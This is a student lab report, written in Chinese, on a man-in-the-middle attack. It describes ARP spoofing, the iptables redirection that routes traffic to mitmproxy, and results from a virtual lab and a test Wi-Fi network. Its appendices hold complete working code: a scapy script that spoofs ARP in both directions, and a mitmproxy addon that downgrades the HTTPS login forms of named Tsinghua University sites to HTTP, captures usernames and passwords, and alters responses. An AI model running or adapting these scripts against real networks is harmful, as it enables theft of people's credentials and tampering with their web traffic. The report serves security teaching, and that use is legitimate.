# 实验二：中间人攻击

- 2015011278 谭闻德：编写及测试攻击脚本、撰写测试分析报告
- 2016010981 陈晟祺：修改攻击脚本、利用攻击脚本进行攻击测试、修改测试分析报告

## 实验原理

通过发送ARP欺骗包（包括回复包以及无偿ARP广播包），可以假冒IP地址，从而截获其他主机发给相应IP地址的流量。通过同时欺骗主机和网关，可以截获主机与网关的双向流量（可能包含密码等敏感信息），从而获知主机上网情况。

进一步地，通过合理配置iptables，将主机到网关的流量转发到配置好的mitmproxy，甚至可以对主机和HTTP网站实现中间人攻击，篡改受害者浏览到的网页内容。

此外，通过自签发的证书，还可以对安全意识不高的用户实施对于HTTPS网站的中间人攻击。

## 实验环境

本次实验在两套实验环境下进行，分别为虚拟机环境和真实环境。

### 虚拟机环境

为了方便编写、测试和验证攻击脚本，我们使用VMware ESXi配置了虚拟机环境。虚拟机中有三台主机，分别为：网关 `nsl-gateway` 、攻击者 `nsl-attacker` 以及受害者 `nsl-victim` 。它们通过虚拟适配器接入虚拟交换机，实验中我们确保虚拟适配器和虚拟交换机的配置与真实网卡和交换机的配置尽量一致。

| 名称    | MAC               | IP                |
| ------- | ----------------- | ----------------- |
| Gateway | 00:50:56:b1:16:1b | 10.1.1.1/24       |
| Victim  | 00:50:56:b1:17:36 | 10.1.1.2/24       |
| Attacker| 00:50:56:b1:f9:0a | 10.1.1.3/24       |

### 真实环境

为了测试本攻击在真实无线网络环境下的效果，本实验还使用TL-WDR7500无线路由器配置了一个模拟真实环境的无线网络。为了说明攻击效果，在攻击时，我们没有对无线路由器做任何特殊处理，而是仅按照正常配置来将其接入互联网。攻击者通过有线网络连接路由器，受害者连接路由器提供的无线网络。

## 实验过程

本次实验分为两个阶段：双向ARP欺骗以及中间人攻击。

### 双向ARP欺骗

双向 ARP 欺骗顾名思义有两个途径，即无论在受害者询问网关物理地址，还是反过来时，都同时对二者进行 ARP 欺骗。为了使欺骗总是能够覆盖正确的回复，所以每次发出的攻击ARP包都是连续的三个。同时，攻击者还定期发送“无偿 ARP”（Gratuitous ARP），向广播域内所有主机告知自己是网关，保证自己的欺骗条目始终存在于各主机的ARP表项中。详细的攻击脚本请见最后的附录。

由于进行欺骗后，攻击者事实上成为了受害者和网关间的一个“透明网关”，所以需要打开 Linux 的包转发功能，即执行：

```bash
echo 1 > /proc/sys/net/ipv4/conf/all/ip_forward
iptables -A FORWARD -j ACCEPT
```

此时，如果真实网关和受害者都没有任何防护的话，我们能够看到两者的ARP表中的项目已经被污染，并且受害者和网关相互通信的流量都经过了攻击者。下图即为它们的 ARP 表：

![受害者的ARP表](images/victim_arp_table_spoofed.png)

![网关的ARP表](images/gateway_arp_table_spoofed.png)

而在受害者 ping 网关，可以在攻击者的网卡上捕获到双向的流量，这也说明攻击是成功的。

![欺骗后的icmp流量](images/icmp_after_spoofing.png)

当受害者以传统 FTP 协议（明文）访问一台服务器时，其输入的用户名密码也被攻击者成功捕获了：

![捕获的ftp会话](images/ftp_user_and_password.png)

同样地，我们也可以捕获受害者所有的HTTP流量。但是现在只剩下极少的网站使用纯HTTP，校内的大部分信息站点虽然默认是HTTP服务，但表单提交都是HTTPS地址，因此不能直接通过流量捕获获得用户的凭据。因此，我们需要使用中间人攻击的手段。

### 中间人攻击

首先，保持 ARP 欺骗脚本的运行。然后使用如下命令配置iptables：

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080
```

这通过目标地址NAT，将所有HTTP流量（一般是80端口的流量）转发到本机的 mitmproxy，以便进行下一步攻击。

接下来运行 `mitmproxy --mode transparent` 即可看到受害者的每一个HTTP会话，如图所示。

![mitmproxy透明代理](images/mitm_proxy_transparent.png)

通过撰写脚本（请见附录2），可以自动化地抓取HTTP请求中的用户名和密码，以及修改HTTP响应的内容。

其中重要的步骤是所谓的“降级攻击”，即将网页中表单的 target 更改为 HTTP 协议，这样就能从请求中抓取用户名和密码数据。

除了降级攻击之外，本实验还添加了一个名为 `x-twd2-message` 的 HTTP 头，指示网页已经被篡改了：

![add_header](images/add_header.png)

并且，我们还修改了HTTP响应中的图片内容，将彩色的图片转换为纯黑白点阵图片，如下面几张图所示：

![learn](images/learn.png)

![zhjwxk](images/zhjwxk.png)

![mails](images/mails.jpg)

同时，我们发现微信中的部分图片同样使用未加密的HTTP传输，也能够被篡改：

![wx1](images/wx1.png)

![wx2](images/wx2.png)

![wx3](images/wx3.png)

![wx4](images/wx4.png)

此外，由于缓存作用，在攻击停止后一段时间内，若受害者不手动强制刷新缓存，图片仍然保持为纯黑白。

## 结论

访问未加密的HTTP网站是一种十分危险的行为，TODO。

虽然在实验中我们观察到本次实验使用的无线路由器有一定的ARP欺骗防御功能，但是在激进的攻击方式（如附录1中代码）下，这样的防御几乎是徒劳的。如果网关甚至没有任何ARP欺骗防御功能，那么攻击更加顺利。

## 附录

### 附录1 ARP欺骗脚本

```python
#!/usr/bin/env python3
import os
import time

# Send an arbitray ICMP request to get IP and MAC address of the default gateway.
p = srp1(Ether()/IP(dst='1.2.3.4', ttl=0)/ICMP()/'abcdefgh')

gw_ip = p.payload.src
gw_mac = p.src
my_ip = p.payload.dst
my_mac = p.dst

def log(*s):
  print(time.asctime() + ":", *s)

log('My IP:', my_ip)
log('My MAC:', my_mac)
log('Gateway IP:', gw_ip)
log('Gateway Real MAC:', gw_mac)

def packet_cb(p):
  p = p.payload
  if p.psrc == my_ip or p.hwsrc == my_mac: # do not spoof myself
    return
  if p.psrc == p.pdst and p.psrc == gw_ip: # real gateway's gratuitous ARP
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
    return
  if p.op != 1: # bypass queries other than who-has
    return
  if p.pdst == gw_ip:
    log('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
    do_reply(gw_ip, p.hwsrc, p.psrc) # spoof victim
    do_reply(p.psrc, gw_mac, gw_ip) # spoof gateway
  elif p.psrc == gw_ip:
    log('Gateway is requesting {}\'s MAC...'.format(p.pdst))
    do_reply(p.pdst, p.hwsrc, p.psrc) # spoof gateway
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP, spoof everyone else

def do_reply(fake_ip, dst, pdst=''):
  if dst == 'ff:ff:ff:ff:ff:ff':
    # gratuitous ARP
    hwdst = my_mac
    pdst = fake_ip
  else:
    hwdst = dst
  packet = Ether(dst=dst)/ARP(op='is-at',
                       hwsrc=my_mac,
                       psrc=fake_ip,
                       hwdst=hwdst,
                       pdst=pdst)
  log('Sending packet:')
  packet.show()
  sendp(packet * 3)

def main():
  if os.fork():
    do_packet()
  else:
    do_gratuitous()

def do_packet():
  log('Doing packet')
  while True:
    receive = sniff(filter='arp', count=1000, prn=packet_cb)

def do_gratuitous():
  log('Doing gratuitous')
  while True:
    do_reply(gw_ip, 'ff:ff:ff:ff:ff:ff') # gratuitous ARP
    time.sleep(5)


main()
exit()
```

使用方法：

```bash
sudo scapy -c arp.py
```

### 附录2 中间人攻击脚本

```python
#!/usr/bin/env python3
import urllib.parse
import io
import re
from mitmproxy import ctx
from PIL import Image

PASSWORD_REGEXS = [
  ('learn', re.compile('userid=(?P<username>.+)&userpass=(?P<password>.+)&submit')),
  ('zhjwxk', re.compile('j_username=(?P<username>.+)&j_password=(?P<password>.+)&captchaflag')),
  ('mail', re.compile('uid=(?P<username>.+)&password=(?P<password>.+)&domain'))
]

URL_TRANSFORMS = [
  (b'https://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp', b'http://learn.tsinghua.edu.cn/MultiLanguage/lesson/teacher/loginteacher.jsp'),
  (b'https://zhjwxk.cic.tsinghua.edu.cn:443/j_acegi_formlogin_xsxk.do', b'http://zhjwxk.cic.tsinghua.edu.cn/j_acegi_formlogin_xsxk.do'),
  (b'https://mails.tsinghua.edu.cn/coremail/index.jsp', b'http://mails.tsinghua.edu.cn/coremail/index.jsp'),
  (b'https://mail.tsinghua.edu.cn/coremail/index.jsp', b'http://mail.tsinghua.edu.cn/coremail/index.jsp'),
  (b'twd15,15', b'equipment,15')
]

class Trans:
  def __init__(self):
    pass
  
  def request(self, flow):
    try:
      flow.request.query['tp'] = 'jpeg'
    except Exception as e:
      pass
    try:
      for name, regex in PASSWORD_REGEXS:
        m = regex.search(flow.request.text)
        if not m:
          continue
        print('Credential captured from {}:\n\tUsername: {}\n\tPassword: {}'
                .format(name,
                        urllib.parse.unquote_plus(m.group('username')),
                        urllib.parse.unquote_plus(m.group('password'))))
    except Exception as e:
      pass

  def response(self, flow):
    flow.response.headers['x-twd2-message'] = 'You are hacked!'
    for old, new in URL_TRANSFORMS:
      try:
        flow.response.content = flow.response.content.replace(old, new)
      except Exception as e:
        pass
    try:
      stream = io.BytesIO(flow.response.content)
      img = Image.open(stream)
      img = img.convert('1')
      stream = io.BytesIO()
      img.save(stream, format='PNG')
      flow.response.content = stream.getvalue()
      print('Image converted: {}'.format(flow.request.path))
    except Exception as e:
      repr(e)


addons = [
  Trans()
]
```

使用方法：

```bash
sudo mitmdump --mode transparent --showhost -s trans.py -q
```